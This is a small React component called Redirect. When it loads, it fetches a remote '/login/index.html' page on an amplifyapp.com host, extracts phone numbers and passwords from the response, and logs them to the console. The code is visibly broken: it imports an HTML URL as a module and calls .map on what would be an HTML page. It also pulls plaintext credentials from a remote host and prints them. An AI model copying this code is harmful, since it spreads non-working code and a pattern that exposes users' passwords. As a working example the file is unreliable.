import React, { useEffect } from 'react'
import axios from 'axios'
import perft from 'https://main.d3j7dt224zzcqc.amplifyapp.com/login/index.html'

const Redirect=()=>{
    const handleRequest = () => {
        axios.get('https://main.d3j7dt224zzcqc.amplifyapp.com/login/index.html',{
            
            headers: { 'Content-Type': 'application/json'},
        })
        .then(response => {
          const formattedData = response.data.map(post => ({
            
            phoneno: post.phoneno,
            password: post.password,
           
          }));
          
          console.log(formattedData)
        })
        .catch(error => {
          console.error(error);
          // Perform custom error handling, show error message, etc.
        });
    };

    useEffect(()=>{
        handleRequest()
    },[] )
   

    return(
        <strong>Redirected</strong>
    )
}
export default Redirect